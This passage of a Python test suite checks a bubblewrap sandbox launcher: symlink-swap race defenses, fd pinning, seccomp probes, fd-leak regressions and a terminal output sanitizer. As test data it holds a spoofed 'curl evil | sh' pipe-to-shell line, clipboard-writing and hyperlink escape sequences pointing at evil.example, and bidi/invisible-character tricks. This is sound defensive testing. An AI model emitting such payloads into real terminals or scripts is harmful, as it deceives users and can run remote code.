        os.rename(f"{tmp}/a/b", f"{tmp}/a/b_moved")
        os.symlink(f"{tmp}/evil", f"{tmp}/a/b")
        naive = os.open(os.path.realpath(validated), os.O_PATH | os.O_NOFOLLOW)
        assert os.fstat(naive).st_ino != st.st_ino  # naive open WAS redirected
        os.close(naive)
        try:
            sbox.open_path_pinned(validated)
        except ValueError as e:
            assert "symlink" in str(e), e
        else:
            raise AssertionError("intermediate component swap was not detected")

        # Same attack on the FINAL component: swap the file itself for a
        # symlink — the walk must refuse the final symlink too.
        os.rename(f"{tmp}/a/b_moved/target", f"{tmp}/a/b_moved/target_moved")
        os.symlink(f"{tmp}/evil/target", f"{tmp}/a/b_moved/target")
        try:
            sbox.open_path_pinned(f"{tmp}/a/b_moved/target")
        except ValueError as e:
            assert "symlink" in str(e), e
        else:
            raise AssertionError("final component swap was not detected")

        # ENOENT (e.g. --bind-socket of a not-yet-created path) stays a
        # plain OSError so callers can fall back to the path form.
        try:
            sbox.open_path_pinned(f"{tmp}/nope")
        except OSError as e:
            assert e.errno == errno.ENOENT, e
        else:
            raise AssertionError("missing path pinned?!")

        # sockets pin too (--bind-socket through --ro-bind-fd)
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(f"{tmp}/s.sock")
        try:
            fd = sbox.open_path_pinned(f"{tmp}/s.sock")
            assert stat.S_ISSOCK(os.fstat(fd).st_mode)
            os.close(fd)
        finally:
            s.close()


def test_fd_reaches_kernel_view():
    """_fd_reaches is the kernel's own view of what an fd holds (readlink
    of /proc/self/fd/N): it tracks renames — the guard BindPinner.pin uses
    to die when the object moved between the open and the check."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        p = os.path.join(tmp, "obj")
        open(p, "wb").write(b"x")
        fd = sbox.open_path_pinned(p)
        try:
            assert sbox._fd_reaches(fd, p)
            os.rename(p, os.path.join(tmp, "moved"))
            # the kernel now reaches the pinned object by its NEW path
            assert not sbox._fd_reaches(fd, p)
            assert sbox._fd_reaches(fd, os.path.join(tmp, "moved"))
        finally:
            os.close(fd)


def test_bind_pinner_mount_args():
    """build_bwrap mounts the VALIDATED fds: with a pinner (bwrap >= 0.10)
    every attacker-swappable mount — user binds, cwd, --home — goes out as
    --[ro-]bind-fd carrying the exact fd check_bind_paths pinned, and
    without a pinner the classic path flags are kept (old bwrap /
    unknown capabilities)."""
    def build(pinner, **kw):
        opts = argparse.Namespace(net=True, home=kw.get("home", False), gui=False,
                                  ssh_agent=False, ro_cwd=True,
                                  bind=kw.get("bind", []), ro_bind=[],
                                  bind_socket=[])
        binds = sbox.check_bind_paths(opts, "/home/sbox-test-user", pinner)
        out = sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                               "/home/sbox-test-user", binds, None, None, pinner)
        return out[0]

    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        target = os.path.join(tmp, "proj")
        os.makedirs(target)
        oldcwd = os.getcwd()
        os.chdir(target)
        try:
            # no pinner (old bwrap): classic path flags, fd slots are None
            bw = build(None, bind=[target])
            assert "--bind" in bw and "--ro-bind" in bw
            assert not any(a.endswith("-fd") for a in bw), bw
            # disabled pinner: same
            bw = build(sbox.BindPinner(enabled=False), bind=[target])
            assert "--bind" in bw and not any(a.endswith("-fd") for a in bw)

            # enabled pinner: every attacker-swappable mount goes by fd
            pinner = sbox.BindPinner(enabled=True)
            try:
                bw = build(pinner, bind=[target])
                assert "--ro-bind-fd" in bw, bw          # ro cwd mount
                assert "--bind-fd" in bw, bw             # rw user bind
                assert "--ro-bind" in bw                 # system trees stay path-based
                # the fd numbers must be real open fds (bwrap needs them)
                i = bw.index("--bind-fd")
                fd = int(bw[i + 1])
                assert os.fstat(fd).st_ino == os.stat(target).st_ino
                assert bw[i + 2] == os.path.realpath(target)  # dest unchanged
                # one fd per validated object: the cwd and the bind share
                # the path, so exactly one pin exists
                assert set(pinner.fds) == {os.path.realpath(target)}
            finally:
                pinner.close()

            # --home with a SYMLINKED $HOME pins the TARGET (realpath
            # resolved the link; the walk would refuse a symlink).
            link_home = os.path.join(tmp, "home_link")
            real_home_dir = os.path.join(tmp, "home_real")
            os.makedirs(real_home_dir, exist_ok=True)
            if not os.path.lexists(link_home):
                os.symlink(real_home_dir, link_home)

            def build_home(pinner):
                opts = argparse.Namespace(net=True, home=True, gui=False,
                                          ssh_agent=False, ro_cwd=False,
                                          bind=[], ro_bind=[], bind_socket=[])
                return sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                                        link_home, [], None, None, pinner)[0]

            pinner = sbox.BindPinner(enabled=True)
            try:
                bw = build_home(pinner)
                i = bw.index("--bind-fd")
                fd = int(bw[i + 1])
                assert os.fstat(fd).st_ino == os.stat(real_home_dir).st_ino
                assert bw[i + 2] == link_home            # dest = $HOME string
            finally:
                pinner.close()
        finally:
            os.chdir(oldcwd)


def test_shared_pin_named_twice_gets_distinct_fds():
    """The cwd mount and a -b of the same path (or -b $HOME --home) share
    ONE pin — the cache guarantees one fd per validated object — but the
    argv must name that fd only ONCE: every extra use gets an os.dup().
    bwrap consumes setup-op fds itself, and whether a later --bind-fd N
    still resolves after an earlier op attached to N must not depend on
    bwrap's close ordering (nothing exercised cwd==bind against a real
    bwrap; distinct numbers make the argv order-independent)."""
    def named_fds(bw):
        return [int(bw[i + 1]) for i in range(len(bw) - 1)
                if bw[i] in ("--bind-fd", "--ro-bind-fd")]

    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        target = os.path.realpath(os.path.join(tmp, "proj"))
        os.makedirs(target)
        oldcwd = os.getcwd()
        os.chdir(target)
        pinner = sbox.BindPinner(enabled=True)
        try:
            opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                      ro_cwd=False, bind=[target], ro_bind=[],
                                      bind_socket=[])
            binds = sbox.check_bind_paths(opts, "/home/sbox-test-user", pinner)
            bw, _inner, dups = sbox.build_bwrap(opts, "/tmp/sbox-test-sand",
                                                "/tmp/sbox-test-sock",
                                                "/home/sbox-test-user", binds,
                                                None, None, pinner)
            fds = named_fds(bw)
            assert len(fds) == 2, bw            # cwd mount + user bind
            assert fds[0] != fds[1], bw         # DISTINCT numbers, one object
            ino = os.stat(target).st_ino
            assert all(os.fstat(fd).st_ino == ino for fd in fds), fds
            assert len(dups) == 1 and dups[0] == fds[1], (fds, dups)
            # still exactly one pin per validated object in the cache
            assert set(pinner.fds) == {target}, pinner.fds
        finally:
            os.chdir(oldcwd)
            pinner.close()

        # -b $HOME --home: the home mount and the -b entry share the pin too
        link_home = os.path.join(tmp, "home_link")
        real_home = os.path.join(tmp, "home_real")
        os.makedirs(real_home, exist_ok=True)
        if not os.path.lexists(link_home):
            os.symlink(real_home, link_home)
        pinner = sbox.BindPinner(enabled=True)
        os.chdir(target)  # deterministic cwd mount (not the runner's)
        try:
            opts = argparse.Namespace(net=True, home=True, gui=False, ssh_agent=False,
                                      ro_cwd=True, bind=[link_home], ro_bind=[],
                                      bind_socket=[])
            binds = sbox.check_bind_paths(opts, link_home, pinner)
            bw, _inner, dups = sbox.build_bwrap(opts, "/tmp/sbox-test-sand",
                                                "/tmp/sbox-test-sock", link_home,
                                                binds, None, None, pinner)
            fds = named_fds(bw)
            # argv order: home mount, cwd mount (target), the -b $HOME
            # re-bind — the FIRST and LAST are the same object (the
            # shared pin and its dup) under distinct numbers
            assert len(fds) == 3, (bw, fds)
            assert len(set(fds)) == 3, fds
            assert os.fstat(fds[0]).st_ino == os.stat(real_home).st_ino
            assert os.fstat(fds[2]).st_ino == os.stat(real_home).st_ino
            assert os.fstat(fds[1]).st_ino == os.stat(target).st_ino
            assert dups == [fds[2]], (fds, dups)
        finally:
            os.chdir(oldcwd)
            pinner.close()


def test_cwd_socket_rules():
    """The automatic cwd mount goes through the SAME validator as -b
    (validate_bind_source): a cwd that overlaps a host control socket —
    cd /tmp/.X11-unix, an LXD socket dir, a tmux dir — or that CONTAINS a
    Unix socket is NOT auto-mounted (note + /tmp instead), never silently
    bound read-write. This is the older blind spot: -b of those paths was
    refused but `cd` into them was not."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        control_dir = os.path.join(tmp, "ctl")
        os.makedirs(control_dir)
        rp = os.path.realpath(control_dir)
        oldcwd = os.getcwd()
        saved_socks = set(sbox.CONTROL_SOCKETS)

        def build_here():
            opts = argparse.Namespace(net=True, home=False, gui=False,
                                      ssh_agent=False, ro_cwd=False,
                                      bind=[], ro_bind=[], bind_socket=[])
            pinner = sbox.BindPinner(enabled=True)
            buf = io.StringIO()
            try:
                with contextlib.redirect_stderr(buf):
                    bw = sbox.build_bwrap(opts, "/tmp/sbox-test-sand",
                                          "/tmp/sbox-test-sock",
                                          "/home/sbox-test-user", [], None,
                                          None, pinner)[0]
            finally:
                pinner.close()
                os.chdir(oldcwd)
            return bw, buf.getvalue()

        try:
            # a known control-socket directory as cwd (like /tmp/.X11-unix
            # or /var/snap/lxd/common/lxd): not mounted, note says why
            sbox.CONTROL_SOCKETS.add(rp)
            os.chdir(control_dir)
            bw, notes = build_here()
            assert bw[bw.index("--chdir") + 1] == "/tmp", bw
            assert rp not in bw, bw                    # nothing binds the cwd
            assert "control socket" in notes, notes

            # a cwd that merely CONTAINS a socket: same outcome via the
            # scan (CONTROL_SOCKETS entry removed so only the scan fires)
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved_socks)
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.bind(os.path.join(control_dir, "dev.sock"))
            try:
                os.chdir(control_dir)
                bw, notes = build_here()
                assert bw[bw.index("--chdir") + 1] == "/tmp", bw
                assert rp not in bw, bw
                # loud warning, naming the HOST path (not /proc/self/fd/N)
                assert "contains a Unix socket" in notes, notes
                assert f"{rp}/dev.sock" in notes and "/proc/self/fd" not in notes, notes
            finally:
                s.close()
                os.unlink(os.path.join(control_dir, "dev.sock"))

            # a normal cwd mounts as before, fd-based
            os.chdir(control_dir)
            bw, notes = build_here()
            assert bw[bw.index("--chdir") + 1] == rp, bw
            assert "--bind-fd" in bw, bw
        finally:
            os.chdir(oldcwd)
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved_socks)


def test_userns_probe_and_fallback():
    """--disable-userns is probed once: hosts where bwrap cannot run the
    --unshare-user/--disable-userns/--assert combination (setuid bwrap,
    user namespaces disabled system-wide) keep working — the flags are
    dropped with a note instead of turning a working setup into a hard
    failure (the seccomp deny rules still cover unshare/setns/clone)."""
    import contextlib
    import io
    import signal
    import tempfile as tf
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        ok_shim = os.path.join(tmp, "bwrap")
        with open(ok_shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nexec /bin/true\n')
        os.chmod(ok_shim, 0o755)
        saved_path = os.environ["PATH"]
        os.environ["PATH"] = tmp + os.pathsep + saved_path
        try:
            assert sbox.userns_probe_ok() is True
        finally:
            os.environ["PATH"] = saved_path

        # a bwrap that rejects the combination (like setuid bwrap or a
        # kernel with user namespaces off): probe False, run_sandbox
        # drops the flags and notes it instead of dying
        with open(ok_shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\n'
                     'for a in "$@"; do\n'
                     '    [ "$a" = "--assert-userns-disabled" ] && exit 1\n'
                     'done\n'
                     'while [ "$1" != "--" ]; do shift; done\n'
                     'shift\n'
                     'exec "$@"\n')
        opts = argparse.Namespace(
            net=True, home=False, gui=False, ssh_agent=False, ro_cwd=True,
            bind=[], ro_bind=[], bind_socket=[],
            no_seccomp=True, verbose=False, filter_output=False,
            _bwrap_caps={"seccomp": "--add-seccomp-fd", "disable_userns": True,
                         "bind_fd": True})
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        saved_xdg = os.environ.get("XDG_CACHE_HOME")
        errbuf = io.StringIO()
        try:
            # fresh cache dir so the once-a-day note actually prints here
            os.environ["XDG_CACHE_HOME"] = os.path.join(tmp, "cache")
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            with contextlib.redirect_stderr(errbuf):
                rc = sbox.run_sandbox(opts, ["/bin/sh", "-c", "exit 0"], [], None)
        finally:
            if saved_xdg is None:
                os.environ.pop("XDG_CACHE_HOME", None)
            else:
                os.environ["XDG_CACHE_HOME"] = saved_xdg
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        assert "cannot run --disable-userns" in errbuf.getvalue(), errbuf.getvalue()


def test_seccomp_selfprobe():
    """The startup self-probe: the real filter must deny unshare(0) on
    THIS machine (the libc wrapper is the name->number ground truth), and
    a filter built from a table with a WRONG unshare number must be
    caught — the regression that once shipped here (a hand-typed number
    fails silently otherwise)."""
    import platform
    bpf = sbox.build_seccomp_bpf()
    if bpf is None:
        raise unittest.SkipTest(f"no seccomp table for {platform.machine()}")
    try:
        sbox.seccomp_selfprobe(bpf)
    except SystemExit:
        raise unittest.SkipTest("cannot install seccomp filters here (prctl)")
    machine = sbox.seccomp_machine()
    saved = sbox.SECCOMP_SYSCALLS[machine]
    bad = dict(saved)
    bad["unshare"] = saved["socket"]  # plausible-looking, entirely wrong
    sbox.SECCOMP_SYSCALLS[machine] = bad
    try:
        badbpf = sbox.build_seccomp_bpf()
        try:
            sbox.seccomp_selfprobe(badbpf)
        except SystemExit:
            pass
        else:
            raise AssertionError("a wrong unshare number was not caught")
    finally:
        sbox.SECCOMP_SYSCALLS[machine] = saved


def test_no_orphan_pins_reach_payload():
    """The CVE-2024-21626 regression net: a REFUSED cwd must not leak its
    pinned O_PATH fd into the payload — bwrap closes only the fds
    attached to setup ops, an fd attached to nothing survives exec (with
    CLOEXEC cleared by pass_fds), and /proc/self/fd/N/.. then walks the
    HOST mount tree. The shim execs the payload directly, so whatever
    run_sandbox passes is observable as /proc/self/fd inside the command:
    with no binds and no seccomp, only 0/1/2 (plus the listing's own
    dirfd) may exist. Fails if pass_fds is derived from the pinner cache
    instead of the emitted argv, or if a refused cwd's pin is not
    released."""
    import signal
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        listing = os.path.join(tmp, "fds.txt")
        oldcwd = os.getcwd()

        def fds_seen_by_payload(cwd):
            os.chdir(cwd)
            opts = argparse.Namespace(
                net=True, home=False, gui=False, ssh_agent=False, ro_cwd=False,
                bind=[], ro_bind=[], bind_socket=[],
                no_seccomp=True, verbose=False, filter_output=False,
                _bwrap_caps={"seccomp": "--add-seccomp-fd", "disable_userns": False,
                             "bind_fd": True})
            saved_path = os.environ["PATH"]
            saved_sigs = {s: signal.getsignal(s) for s in
                          (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
            try:
                os.environ["PATH"] = tmp + os.pathsep + saved_path
                rc = sbox.run_sandbox(opts, ["/bin/sh", "-c",
                                             f"ls /proc/self/fd >{listing}"], [], None)
            finally:
                os.environ["PATH"] = saved_path
                os.chdir(oldcwd)
                for s, h in saved_sigs.items():
                    signal.signal(s, h)
            assert rc == 0, rc
            return sorted(int(x) for x in open(listing, encoding="utf-8").read().split())

        # a) cwd refused via CONTROL_SOCKETS (the cd /tmp/.X11-unix case):
        #    the string rules run before pinning, so no fd may even exist
        control = os.path.join(tmp, "ctl")
        os.makedirs(control)
        saved_socks = set(sbox.CONTROL_SOCKETS)
        sbox.CONTROL_SOCKETS.add(os.path.realpath(control))
        try:
            assert fds_seen_by_payload(control) <= [0, 1, 2, 3]
        finally:
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved_socks)

        # b) cwd refused via the contains-socket scan: the dir IS pinned
        #    first (the scan needs the fd), then refused — the pin must be
        #    released and pass_fds must come from the argv alone
        scan_dir = os.path.join(tmp, "scan")
        os.makedirs(scan_dir)
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(os.path.join(scan_dir, "dev.sock"))
        try:
            assert fds_seen_by_payload(scan_dir) <= [0, 1, 2, 3]
        finally:
            s.close()


def test_note_stamp_once_per_day():
    """The userns-fallback note is stamped in the cache dir: shown at most
    once a day, so hosts without user namespaces do not print it on every
    launch. An unwritable cache just degrades to always-printing."""
    import contextlib
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        saved_xdg = os.environ.get("XDG_CACHE_HOME")
        os.environ["XDG_CACHE_HOME"] = tmp
        try:
            assert sbox.note_recently_shown("unit-test.note") is False
            sbox.mark_note_shown("unit-test.note")
            assert sbox.note_recently_shown("unit-test.note") is True
            assert os.path.isfile(os.path.join(tmp, "sbox", "unit-test.note"))
        finally:
            if saved_xdg is None:
                os.environ.pop("XDG_CACHE_HOME", None)
            else:
                os.environ["XDG_CACHE_HOME"] = saved_xdg


def test_rm_tree_writable_never_chmods_through_symlinks():
    """Cleanup chmods through O_PATH|O_NOFOLLOW fds (never paths): a
    symlink planted in the sandbox's /tmp must not chmod its HOST target
    (the lstat->chmod window was the carried-over race), a planted FIFO
    must not matter, 0555 dirs still become removable — and a 0000 dir
    must not LEAK $WORK: opening a directory O_RDONLY needs read
    permission the owner lacks there, the open used to fail EACCES, the
    entry was skipped and rmtree failed underneath it. (The chmod itself
    goes through the /proc/self/fd/N magic link of the pinned fd — the
    O_NOFOLLOW open pinned the LINK ITSELF for symlinks, so S_ISLNK
    entries are skipped and the link never redirects the chmod. Proves
    only what the runner's uid allows: as root every mode is readable
    anyway; run as a normal user to exercise the EACCES path.)"""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        victim = os.path.join(tmp, "victim")
        open(victim, "wb").write(b"x")
        os.chmod(victim, 0o644)
        sand = os.path.join(tmp, "sand")
        os.makedirs(os.path.join(sand, "locked"))
        os.makedirs(os.path.join(sand, "locked", "inner"))   # under the 0555 dir
        os.makedirs(os.path.join(sand, "zero"))
        os.makedirs(os.path.join(sand, "wo"))
        open(os.path.join(sand, "zero", "deep"), "wb").close()
        open(os.path.join(sand, "file"), "wb").close()
        os.symlink(victim, os.path.join(sand, "evil"))
        os.mkfifo(os.path.join(sand, "fifo"))
        os.chmod(os.path.join(sand, "locked"), 0o555)
        os.chmod(os.path.join(sand, "zero"), 0o000)
        os.chmod(os.path.join(sand, "wo"), 0o300)   # write-only: no read either
        sbox.rm_tree_writable(sand)
        assert not os.path.exists(sand), "rm_tree_writable left $WORK behind"
        # the symlink's target was never chmod'ed through
        assert stat.S_IMODE(os.stat(victim).st_mode) == 0o644


def test_bwrap_caps_probe():
    """Capability parsing from `bwrap --help` text — probed (not
    version-matched) so distro backports like 0.6.3 (--bind-fd) work."""
    p = sbox.parse_bwrap_caps
    # ancient: --seccomp only
    assert p("    --seccomp FD                 Load and use seccomp rules from FD\n"
             ) == {"seccomp": "--seccomp", "disable_userns": False, "bind_fd": False}
    # 0.8+: disable-userns + assert
    assert p(" --seccomp FD x\n --disable-userns             Disable\n"
             " --assert-userns-disabled     Fail unless\n"
             )["disable_userns"] is True
    # assert without disable must not pass as a pair
    assert p(" --seccomp FD x\n --assert-userns-disabled     Fail unless\n"
             )["disable_userns"] is False
    # current (0.10+): everything; --seccomp is still listed, prefer the
    # repeatable spelling
    caps = p(" --seccomp FD  old\n --add-seccomp-fd FD  new\n"
             " --disable-userns  x\n --assert-userns-disabled y\n"
             " --bind-fd FD DEST  a\n --ro-bind-fd FD DEST b\n")
    assert caps == {"seccomp": "--add-seccomp-fd", "disable_userns": True,
                    "bind_fd": True}
    # nothing at all (pre-0.4.1): seccomp unavailable -> callers fail closed
    assert p(" --bind SRC DEST\n")["seccomp"] is None
    # "--seccomp-fd" must not false-positive on "--seccomp"...
    assert p(" --seccomp-fd FD x\n")["seccomp"] is None
    if shutil.which("bwrap"):
        caps = sbox.bwrap_caps()
        assert caps.get("seccomp") in ("--seccomp", "--add-seccomp-fd"), caps


def test_allow_file_comments_and_blank_lines():
    """-A files promise '#' comments; comment-only and blank lines must be
    skipped (they used to abort the launcher with 'empty entry'), while
    genuinely bad entries still die with a file:line message."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        path = os.path.join(tmp, "allows")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("# full-line comment\n"
                     "\n"
                     "example.com   # trailing comment\n"
                     "pypi.org:443\n")
        entries = sbox.load_allows([], [path])
        assert entries == [
            {"kind": "name", "value": "example.com", "port": None},
            {"kind": "name", "value": "pypi.org", "port": 443},
        ], entries
        with open(path, "a", encoding="utf-8") as fh:
            fh.write("not_a_host!!\n")
        try:
            sbox.load_allows([], [path])
        except SystemExit:
            pass
        else:
            raise AssertionError("invalid allow entry was accepted")


def test_bwrap_runs_payload_as_pid1():
    """--as-pid-1 must be in the bwrap argv: without it bwrap keeps an
    UNFILTERED zombie-reaper init as pid 1 inside the sandbox — the
    filtered command's PARENT — which on Yama ptrace_scope=0 systems can
    be /proc/1/mem-injected (the ptrace-syscall ban does not cover that).
    Runs from a scratch cwd: the runner's real cwd decides whether the
    automatic cwd mount validates (a $HOME cwd or a socket-bearing dir
    behaves differently), and this test must not depend on that."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        oldcwd = os.getcwd()
        os.chdir(tmp)
        try:
            opts = argparse.Namespace(net=False, home=False, gui=False, ssh_agent=False,
                                      ro_cwd=False, bind=[], ro_bind=[])
            bw, _inner, _dups = sbox.build_bwrap(opts, "/tmp/sbox-test-sand",
                                                 "/tmp/sbox-test-sock",
                                                 "/home/sbox-test-user", [], None, None)
        finally:
            os.chdir(oldcwd)
    assert "--as-pid-1" in bw, "bwrap argv must run the payload as pid 1"
    assert "--unshare-all" in bw and "--die-with-parent" in bw


def test_split_argv_filter_output():
    """--filter-output is a valueless flag: split_argv must treat it as a
    single token so the sandboxed command is not mis-split."""
    assert sbox.split_argv(["--filter-output", "--", "echo", "hi"]) == \
        (["--filter-output"], ["echo", "hi"])
    assert sbox.split_argv(["--filter-output", "echo", "-v"]) == \
        (["--filter-output"], ["echo", "-v"])


def test_split_argv_rejects_clustered_shorts():
    """Clustered short FLAGS (-va example.com) are valid argparse but
    meaningless to split_argv's tokenizer: the cluster consumed one token
    slot and the NEXT token (the -a value) parsed as the sandboxed
    command. Rejected loudly instead of mis-splitting. Attached short
    VALUES (-b/some/path, -aexample.com) are valid argparse too and keep
    working: one token, value included."""
    for argv in (["-va", "example.com", "--", "cmd"],
                 ["-vv", "--", "x"],
                 ["-vb", "/tmp"],
                 ["-vr", "/tmp"]):
        try:
            sbox.split_argv(argv)
        except SystemExit:
            continue
        raise AssertionError(f"{argv} was not rejected")
    assert sbox.split_argv(["-v", "-a", "example.com", "--", "cmd"]) == \
        (["-v", "-a", "example.com"], ["cmd"])
    assert sbox.split_argv(["-a=com", "cmd"]) == (["-a=com"], ["cmd"])
    assert sbox.split_argv(["-a", "com", "cmd"]) == (["-a", "com"], ["cmd"])
    assert sbox.split_argv(["--allow=com", "--verbose", "--", "x", "-y"]) == \
        (["--allow=com", "--verbose"], ["x", "-y"])
    # attached short values: one token each, argparse-compatible
    assert sbox.split_argv(["-b/some/path", "--", "cmd"]) == \
        (["-b/some/path"], ["cmd"])
    assert sbox.split_argv(["-aexample.com", "cmd"]) == \
        (["-aexample.com"], ["cmd"])
    assert sbox.split_argv(["-r/tmp", "-v", "--", "x"]) == \
        (["-r/tmp", "-v"], ["x"])
    assert sbox.split_argv(["-b/x", "cmd"]) == (["-b/x"], ["cmd"])
    assert sbox.split_argv(["-aexample.com", "--", "cmd"]) == \
        (["-aexample.com"], ["cmd"])
    # ...and a dying cluster in front of a value token still dies ("-av"
    # is NOT one: argparse reads it as -a with attached value "v")
    try:
        sbox.split_argv(["-va", "h", "cmd"])
    except SystemExit:
        pass
    else:
        raise AssertionError("['-va', 'h', 'cmd'] was not rejected")
    assert sbox.split_argv(["-av", "h", "cmd"]) == (["-av"], ["h", "cmd"])


# -------------------------------------------------- output sanitizer unit ---


def test_sanitizer_text_passthrough():
    """Plain printable text, \n \r \t and ordinary Unicode pass through
    untouched (decoding is UTF-8 with errors='replace')."""
    s = sbox.OutputSanitizer()
    data = "hello wörld 中文 emoji \U0001f680\na\tb\rc\n"
    out = s.feed(data.encode("utf-8"))
    assert out == data, repr(out)


def test_sanitizer_c0_c1_dropped():
    """C0 controls except \n \r \t, DEL and the whole C1 block (incl.
    U+009B CSI — which must NOT act as a sequence initiator) are
    dropped; surrounding text survives."""
    s = sbox.OutputSanitizer()
    out = s.feed(b"a\x00b\x07c\x08d\x0be\x0cf\x1fg\x7fh\xc2\x9bi\xc2\x85j\xc2\x9dk\n")
    assert out == "abcdefghijk\n", repr(out)


def test_sanitizer_strict_cr():
    """strict_cr=True drops every \r not immediately followed by \n: a
    bare \r moves the cursor to column 0, so payload output can visually
    overwrite the current line after you read it ("curl evil | sh\r" +
    "ok"). CRLF survives, lone \r (incl. \r\r and end-of-stream) is
    dropped, and sequences after a dropped \r still filter normally."""
    s = sbox.OutputSanitizer(strict_cr=True)
    assert s.feed(b"a\r\nb\rc\r\rd\r") + s.flush() == "a\r\nbcd", "strict"
    # the spoof: second half of the line overwrites the first visually
    s2 = sbox.OutputSanitizer(strict_cr=True)
    assert s2.feed(b"$ curl evil | sh\rok\r\n") == "$ curl evil | shok\r\n"
    # default mode keeps bare \r (progress bars depend on it)
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"a\rb\r\n") + s3.flush() == "a\rb\r\n"
    # a dropped \r does not eat the following escape sequence
    s4 = sbox.OutputSanitizer(strict_cr=True)
    assert s4.feed(b"X\r\x1b]52;c;Zm9v\ay\x1b[31mz\x1b[0m\r\n") == \
        "Xy\x1b[31mz\x1b[0m\r\n"
    # trailing \r held across a chunk boundary finds its \n later
    s5 = sbox.OutputSanitizer(strict_cr=True)
    assert s5.feed(b"end\r") == "end"
    assert s5.feed(b"\n!") == "\r\n!"


def test_sanitizer_bidi_zero_width_dropped():
    """Bidi overrides and zero-width/invisible characters deceive the
    reader (reverse rendering, hidden payloads) — dropped."""
    s = sbox.OutputSanitizer()
    evil = "a\u202eb\u200bc\u200bd\u2066e\u2060f\ufeffg\u2066h\u202di\n"
    assert s.feed(evil.encode("utf-8")) == "abcdefghi\n"
    # non-printable separators (NBSP) are dropped too: allowlist
    s2 = sbox.OutputSanitizer()
    assert s2.feed("a\u00a0b\n".encode()) == "ab\n"


def test_sanitizer_sgr_allowed():
    """Valid SGR color/style passes through verbatim: plain, empty
    (reset), multi-parameter, 256-color and truecolor forms."""
    payload = (b"\x1b[31mred\x1b[0m \x1b[m \x1b[1;32mx\x1b[0;1m \x1b[38;5;196m "
               b"\x1b[48;2;1;2;3m\n\x1b[92mbright\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == payload.decode(), repr(s.feed(payload))


def test_sanitizer_sgr_conceal_dropped():
    """SGR 8 (conceal/invisible text) is stripped — leading zeros and
    embedded positions included; the whole sequence is dropped rather
    than rewritten. 38/48 extended-color subparameters are NOT conceal
    ('38;5;8' selects color index 8) and must survive."""
    for seq in (b"\x1b[8m", b"\x1b[08m", b"\x1b[008m", b"\x1b[1;8m", b"\x1b[;8m",
                b"\x1b[0;8;31m", b"\x1b[38;5;196;8m"):
        s = sbox.OutputSanitizer()
        assert s.feed(seq + b"X") == "X", seq
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b[38;5;8mA\x1b[48;2;8;8;8mB") == "\x1b[38;5;8mA\x1b[48;2;8;8;8mB"


def test_sanitizer_sgr_length_cap():
    """The SGR parameter string must not exceed 64 characters — longer
    ones (even all-digits) are dropped."""
    s = sbox.OutputSanitizer()
    ok = b"\x1b[" + b"1;" * 31 + b"1m"          # 63 chars of params
    assert s.feed(ok) == ok.decode()
    s2 = sbox.OutputSanitizer()
    bad = b"\x1b[" + b"1;" * 32 + b"1m"          # 65 chars of params
    assert s2.feed(bad) == ""


def test_sanitizer_non_sgr_csi_dropped():
    """Every non-SGR CSI is dropped: cursor movement, screen clears,
    device status queries (answerback triggers), private-marked
    sequences, mode set/reset, colon subparameters."""
    payload = (b"A\x1b[2JB\x1b[5AC\x1b[cD\x1b[0cE\x1b[?25lF\x1b[>0cG\x1b[1;2H"
               b"H\x1b[hI\x1b[4hJ\x1b[38:5:196mK\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == "ABCDEFGHIJK\n", repr(s.feed(payload))


def test_sanitizer_strings_dropped():
    """OSC (titles, OSC 52 clipboard writes, OSC 8 hyperlinks — the link
    TEXT stays visible, its markup does not), DCS, APC, PM and SOS
    strings are dropped wholesale, terminated by BEL or ST (ESC \\)
    alike."""
    payload = (b"\x1b]0;title\x07A"
               b"\x1b]52;c;cGFzdGU=\x07B"
               b"\x1b]8;;http://evil.example\x1b\\link\x1b]8;;\x1b\\C"
               b"\x1bP+q544e\x1b\\D"
               b"\x1b_apc\x1b\\E"
               b"\x1b^pm\x1b\\F"
               b"\x1bXsos\x1b\\G\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == "ABlinkCDEFG\n", repr(s.feed(payload))


def test_sanitizer_esc_sequences_dropped():
    """2-byte ESC sequences (save/restore cursor, reverse LF, charset)
    and 3-byte intermediate forms (ESC ( B — ncurses emits these) are
    dropped without leaking their final byte as text."""
    s = sbox.OutputSanitizer()
